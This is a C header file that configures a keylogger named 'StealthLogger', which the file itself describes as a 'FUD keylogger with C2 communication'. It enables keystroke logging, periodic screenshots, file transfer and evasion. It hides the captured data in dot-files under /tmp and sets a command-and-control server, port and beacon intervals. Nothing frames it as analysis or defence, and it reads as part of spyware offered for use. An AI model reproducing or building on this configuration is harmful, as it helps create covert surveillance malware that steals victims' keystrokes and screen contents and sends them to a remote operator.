#ifndef PAYLOAD_CONFIG_H
#define PAYLOAD_CONFIG_H

// Payload configuration
#define PAYLOAD_VERSION "1.2.0"
#define PAYLOAD_NAME "StealthLogger"
#define PAYLOAD_DESCRIPTION "FUD keylogger with C2 communication"

// Compile-time options
#define ENABLE_KEYLOGGER 1
#define ENABLE_SCREENSHOT 1
#define ENABLE_FILE_TRANSFER 1
#define ENABLE_EVASION 1

// Keylogger settings
#define KEYLOGGER_LOG_FILE "/tmp/.system.log"
#define KEYLOGGER_FLUSH_INTERVAL 300 // seconds

// Screenshot settings
#define SCREENSHOT_DIR "/tmp/.screenshots"
#define SCREENSHOT_INTERVAL 600 // seconds

// C2 settings
#define C2_SERVER "c2.stealthlogger.com"
#define C2_PORT 443
#define C2_RECONNECT_INTERVAL 60 // seconds
#define C2_HEARTBEAT_INTERVAL 300 // seconds

#endif // PAYLOAD_CONFIG_H
